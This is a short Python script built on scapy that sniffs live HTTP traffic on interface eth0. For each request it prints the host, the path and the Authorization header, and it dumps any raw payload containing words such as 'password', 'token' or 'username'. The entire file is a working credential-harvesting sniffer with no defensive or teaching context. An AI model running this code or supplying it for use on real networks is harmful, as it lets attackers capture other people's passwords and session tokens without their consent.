import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface ,prn=analyse_packets)

def analyse_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        print("Target Site : " ,packet[http.HTTPRequest].Host)
        print("Site Path : " ,packet[http.HTTPRequest].Path)
        print("User Authorization : " ,packet[http.HTTPRequest].Authorization)
        if packet.haslayer(scapy.Raw):
            keywords = ["token" ,"user" ,
            "username","pass" ,"password",
            "email","name"]
            for keyword in keywords:
                if keyword in packet[scapy.Raw].load:
                    print("userful info : " , packet[scapy.Raw].load)
                    break

sniff("eth0")